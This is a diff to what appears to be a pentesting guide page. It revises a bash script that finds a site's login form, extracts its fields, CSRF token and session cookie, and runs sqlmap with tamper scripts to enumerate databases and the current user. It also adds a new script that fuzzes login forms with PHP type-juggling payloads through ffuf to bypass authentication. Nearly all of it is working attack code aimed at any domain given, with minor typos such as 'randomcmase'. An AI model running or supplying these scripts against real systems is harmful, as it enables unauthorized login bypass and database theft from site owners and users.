@@ -254,8 +254,6 @@ if [ -z "$LOGIN" ]; then
     exit 1
 fi
 
-color_print GREEN "[+] Found login page: $LOGIN"
-
 # Fetch HTML
 HTML=$(curl -s "$LOGIN")
 FORM=$(echo "$HTML" | sed -n '/<form/,/<\/form>/p' | head -n 100)
@@ -263,7 +261,8 @@ FORM=$(echo "$HTML" | sed -n '/<form/,/<\/form>/p' | head -n 100)
 # CAPTCHA / reCAPTCHA Check
 CAPTCHA_KEYWORDS="g-recaptcha|recaptcha|h-captcha|data-sitekey|captcha|grecaptcha.execute|hcaptcha.execute"
 if echo "$HTML" | grep -qiE "$CAPTCHA_KEYWORDS"; then
-    color_print YELLOW "[!] CAPTCHA detected on login page. Continuing anyway..."
+    echo "[!] CAPTCHA detected on login page. Brute-force aborted."
+    exit 1
 fi
 
 # Extract Form Action and Method
@@ -283,10 +282,7 @@ else
     FULL_ACTION="${BASE_URL}${ACTION}"
 fi
 
-color_print CYAN "[+] Form Action: $FULL_ACTION"
-color_print CYAN "[+] Form Method: $METHOD"
-
-# Extract Username & Password Fields
+# Extract Username & Password Ffiles
 USERNAME_FIELD=$(echo "$FORM" | grep -oEi '<input[^>]*name="[^"]+"' | \
 grep -Ei 'user(name)?|login(_id)?|userid|uname|mail|email|auth_user' | head -1 | sed -E 's/.*name="([^"]+)".*/\1/')
 PASSWORD_FIELD=$(echo "$FORM" | grep -oEi '<input[^>]*name="[^"]+"' | \
@@ -295,10 +291,7 @@ grep -Ei 'pass(word)?|passwd|pwd|auth_pass|login_pass' | head -1 | sed -E 's/.*n
 [ -z "$USERNAME_FIELD" ] && USERNAME_FIELD="username"
 [ -z "$PASSWORD_FIELD" ] && PASSWORD_FIELD="password"
 
-color_print CYAN "[+] Username field: $USERNAME_FIELD"
-color_print CYAN "[+] Password field: $PASSWORD_FIELD"
-
-# CSRF Token Extraction
+# CSRF Token Extration
 CSRF_FIELD=""
 CSRF_VALUE=""
 
@@ -318,63 +311,65 @@ if [ -z "$CSRF_FIELD" ] && [ -n "$HIDDEN_INPUTS" ]; then
     CSRF_VALUE=$(echo "$HIDDEN_INPUTS" | grep -oiP 'value=["'\'']?\K[^"'\'' ]+' | head -1)
 fi
 
-if [ -n "$CSRF_FIELD" ] && [ -n "$CSRF_VALUE" ]; then
-    color_print CYAN "[+] CSRF field found: $CSRF_FIELD"
-fi
+# Prepre POST Data
+DATA="${USERNAME_FIELD}=testtesttest&${PASSWORD_FIELD}=testtesttest"
+[ -n "$CSRF_FIELD" ] && [ -n "$CSRF_VALUE" ] && DATA="${CSRF_FIELD}=${CSRF_VALUE}&${DATA}"
 
 # Extract Cookies
-COOKIES=$(curl -s -I "$LOGIN" \
+COOKIES=$(curl -s -I "$URL" \
   | grep -i '^Set-Cookie:' \
   | sed -E 's/^Set-Cookie: //I' \
   | cut -d';' -f1 \
-  | tr '\n' ';' \
-  | sed 's/;$//')
+  | grep -i 'PHPSESSID')
 
 # Extract only domain and port
 HOST=$(echo "$URL" | sed -E 's~^https?://([^/]+).*~\1~')
 
-# Prepare data for sqlmap
+# Headers
+HEADERS=(
+  -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
+  -H "Accept-Language: en-US,fa-IR;q=0.5"
+  -H "Accept-Encoding: gzip, deflate"
+  -H "Content-Type: application/x-www-form-urlencoded"
+  -H "Origin: $URL"
+  -H "Sec-GPC: 1"
+  -H "Connection: keep-alive"
+  -H "Referer: $LOGIN"
+  -H "Upgrade-Insecure-Requests: 1"
+  -H "Priority: u=0, i"
+)
+
+#  Convert Headers → sqlmap Format
+SQLMAP_HEADERS=""
+for h in "${HEADERS[@]}"; do
+    CLEANED=$(echo "$h" | sed 's/^-H //')
+    SQLMAP_HEADERS="${SQLMAP_HEADERS}${CLEANED}\n"
+done
+
+# Run SQLMAP
 if [[ "$METHOD" == "get" ]]; then
-    # For GET requests, sqlmap will use URL parameters
-    SQLMAP_URL="${FULL_ACTION}?${USERNAME_FIELD}=test&${PASSWORD_FIELD}=test"
-    [ -n "$CSRF_FIELD" ] && [ -n "$CSRF_VALUE" ] && SQLMAP_URL="${SQLMAP_URL}&${CSRF_FIELD}=${CSRF_VALUE}"
+    SQLMAP_URL="${FULL_ACTION}?${DATA}"
     sqlmap -u "$SQLMAP_URL" \
+        --headers="$SQLMAP_HEADERS" \
         --cookie="$COOKIES" \
-        --batch \
-        --level=3 \
-        --risk=3 \
-        -v 3 \
-        --user-random-agent \
-        --threads=10 \
-        --tamper=space2comment,charencode \
+        --batch --level=5 --risk=3 -v 3 \
+        --user-random-agent --threads=10 \
+        --tamper=space2comment,randomcmase \
         --string="dashboard\|welcome\|home\|profile\|logout\|admin" \
         --not-string="invalid\|incorrect\|failed\|error\|denied" \
-        --dbs \
-        --banner \
-        --current-user \
-        --current-db \
-        --is-dba
+        --dbs --banner --current-user --current-db --is-dba
+
 else
-    # For POST requests, prepare data string
-    DATA="${USERNAME_FIELD}=test&${PASSWORD_FIELD}=test"
-    [ -n "$CSRF_FIELD" ] && [ -n "$CSRF_VALUE" ] && DATA="${CSRF_FIELD}=${CSRF_VALUE}&${DATA}"
     sqlmap -u "$FULL_ACTION" \
         --data="$DATA" \
+        --headers="$SQLMAP_HEADERS" \
         --cookie="$COOKIES" \
-        --batch \
-        --level=3 \
-        --risk=3 \
-        -v 3 \
-        --user-random-agent \
-        --threads=10 \
-        --tamper=space2comment,charencode \
+        --batch --level=5 --risk=3 -v 3 \
+        --user-random-agent --threads=10 \
+        --tamper=space2comment,randomcmase \
         --string="dashboard\|welcome\|home\|profile\|logout\|admin" \
         --not-string="invalid\|incorrect\|failed\|error\|denied" \
-        --dbs \
-        --banner \
-        --current-user \
-        --current-db \
-        --is-dba
+        --dbs --banner --current-user --current-db --is-dba
 fi
 ```
 
@@ -399,13 +394,175 @@ sudo nano auth-bypass-tj.sh
 ```
 
 ```bash
-aaaa
-a
-a
-a
-a
-a
-a
+#!/bin/bash
+
+# Config & Colors
+RED='\e[1;31m'; GREEN='\e[1;32m'; YELLOW='\e[1;33m'; CYAN='\e[1;36m'; RESET='\e[0m'
+color_print() { printf "${!1}%b${RESET}\n" "$2"; }
+
+# Root Check
+[[ "$(id -u)" -ne 0 ]] && { color_print RED "[X] Please run as ROOT."; exit 1; }
+
+# Input Check
+if [ $# -lt 1 ]; then
+    echo "Usage: $0 <domain.com>"
+    exit 1
+fi
+
+URL="$1"
+DEPS="git ffuf"
+
+# Install Katana
+if ! command -v katana &>/dev/null; then
+    color_print GREEN "[*] Installing katana ..."
+    go install github.com/projectdiscovery/katana/cmd/katana@latest;sudo ln -fs ~/go/bin/katana /usr/bin/katana
+fi
+
+# Install Packages
+for pkg in $DEPS; do
+    if ! dpkg -s "$pkg" &>/dev/null; then
+        color_print YELLOW "[!] Installing $pkg..."
+        apt install -y "$pkg"
+    fi
+done
+
+# Wordlist – Type Juggling Payloads
+cat <<EOF > "/tmp/type-juggling.txt"
+0
+0e0
+0e12345
+0e215962017
+0e11111111
+0e1294123
+null
+NULL
+true
+false
+"0"
+"0e0"
+"null"
+[]
+{}
+EOF
+
+# Find Login Page
+LOGIN=$(katana -u "$URL" -depth 3 -silent | \
+grep -iE "/(login|signin|sign-in|auth|user/login|admin/login|my-account|account|wp-login\.php)(/)?$" | \
+grep -viE "lost-password|reset|forgot|register|signup|signout|logout|\.(js|css|jpg|png|gif|svg|ico)$" | \
+sed 's:[/?]*$::' | sed 's:$:/:')
+
+if [ -z "$LOGIN" ]; then
+    echo "[!] No login page found. Exiting."
+    exit 1
+fi
+
+# Fetch HTML
+HTML=$(curl -s "$LOGIN")
+FORM=$(echo "$HTML" | sed -n '/<form/,/<\/form>/p' | head -n 100)
+
+# CAPTCHA / reCAPTCHA Check
+CAPTCHA_KEYWORDS="g-recaptcha|recaptcha|h-captcha|data-sitekey|captcha|grecaptcha.execute|hcaptcha.execute"
+if echo "$HTML" | grep -qiE "$CAPTCHA_KEYWORDS"; then
+    echo "[!] CAPTCHA detected on login page. Brute-force aborted."
+    exit 1
+fi
+
+# Extract Form Action and Method
+ACTION=$(echo "$FORM" | grep -oEi 'action="[^"]*"' | head -1 | cut -d'"' -f2)
+[ -z "$ACTION" ] && ACTION="$LOGIN"
+
+METHOD=$(echo "$FORM" | grep -oEi 'method="[^"]+"' | head -1 | cut -d'"' -f2 | tr '[:upper:]' '[:lower:]')
+[ -z "$METHOD" ] && METHOD="post"
+
+if [[ "$ACTION" == /* ]]; then
+    BASE_URL=$(echo "$URL" | sed 's|^\(https\?://[^/]*\).*|\1|')
+    FULL_ACTION="${BASE_URL}${ACTION}"
+elif [[ "$ACTION" =~ ^https?:// ]]; then
+    FULL_ACTION="$ACTION"
+else
+    BASE_URL=$(echo "$LOGIN" | sed 's|\(https\?://.*/\).*|\1|')
+    FULL_ACTION="${BASE_URL}${ACTION}"
+fi
+
+# Extract Username & Password Ffiles
+USERNAME_FIELD=$(echo "$FORM" | grep -oEi '<input[^>]*name="[^"]+"' | \
+grep -Ei 'user(name)?|login(_id)?|userid|uname|mail|email|auth_user' | head -1 | sed -E 's/.*name="([^"]+)".*/\1/')
+PASSWORD_FIELD=$(echo "$FORM" | grep -oEi '<input[^>]*name="[^"]+"' | \
+grep -Ei 'pass(word)?|passwd|pwd|auth_pass|login_pass' | head -1 | sed -E 's/.*name="([^"]+)".*/\1/')
+
+[ -z "$USERNAME_FIELD" ] && USERNAME_FIELD="username"
+[ -z "$PASSWORD_FIELD" ] && PASSWORD_FIELD="password"
+
+# CSRF Token Extration
+CSRF_FIELD=""
+CSRF_VALUE=""
+
+HIDDEN_INPUTS=$(echo "$FORM" | grep -oiP '<input[^>]+type=["'\'']?hidden["'\'']?[^>]*>')
+while read -r INPUT; do
+    NAME=$(echo "$INPUT" | grep -oiP 'name=["'\'']?\K[^"'\'' ]+')
+    VALUE=$(echo "$INPUT" | grep -oiP 'value=["'\'']?\K[^"'\'' ]+')
+    if [[ "$NAME" =~ csrf|token|nonce|authenticity|verification ]]; then
+        CSRF_FIELD="$NAME"
+        CSRF_VALUE="$VALUE"
+        break
+    fi
+done <<< "$HIDDEN_INPUTS"
+
+if [ -z "$CSRF_FIELD" ] && [ -n "$HIDDEN_INPUTS" ]; then
+    CSRF_FIELD=$(echo "$HIDDEN_INPUTS" | grep -oiP 'name=["'\'']?\K[^"'\'' ]+' | head -1)
+    CSRF_VALUE=$(echo "$HIDDEN_INPUTS" | grep -oiP 'value=["'\'']?\K[^"'\'' ]+' | head -1)
+fi
+
+# Prepre POST Data
+DATA="${USERNAME_FIELD}=FUZZ1&${PASSWORD_FIELD}=FUZZ2"
+[ -n "$CSRF_FIELD" ] && [ -n "$CSRF_VALUE" ] && DATA="${CSRF_FIELD}=${CSRF_VALUE}&${DATA}"
+
+# Extract Cookies
+COOKIES=$(curl -s -I "$URL" \
+  | grep -i '^Set-Cookie:' \
+  | sed -E 's/^Set-Cookie: //I' \
+  | cut -d';' -f1 \
+  | grep -i 'PHPSESSID')
+
+# Extract only domain and port
+HOST=$(echo "$URL" | sed -E 's~^https?://([^/]+).*~\1~')
+
+# Headers
+HEADERS=(
+  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:142.0) Gecko/20100101 Firefox/142.0"
+  -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
+  -H "Accept-Language: en-US,fa-IR;q=0.5"
+  -H "Accept-Encoding: gzip, deflate"
+  -H "Content-Type: application/x-www-form-urlencoded"
+  -H "Origin: $URL"
+  -H "Sec-GPC: 1"
+  -H "Connection: keep-alive"
+  -H "Referer: $LOGIN"
+  -H "Cookie: $COOKIES"
+  -H "Upgrade-Insecure-Requests: 1"
+  -H "Priority: u=0, i"
+)
+
+# Run FFUF
+if [[ "$METHOD" == "get" ]]; then
+    FFUF_URL="${FULL_ACTION}?${DATA}"
+    ffuf -u "$FFUF_URL" \
+         -w "/tmp/type-juggling.txt:FUZZ1" \
+         -w "/tmp/type-juggling.txt:FUZZ2" \
+         -X GET \
+         -ac -c -r \
+         -mc 200 \
+         "${HEADERS[@]}"
+else
+    ffuf -u "$FULL_ACTION" \
+         -w "/tmp/type-juggling.txt:FUZZ1" \
+         -w "/tmp/type-juggling.txt:FUZZ2" \
+         -X POST \
+         -d "$DATA" \
+         -ac -c -r \
+         -mc 200 \
+         "${HEADERS[@]}"
+fi
 ```
 
 {% hint style="info" %}
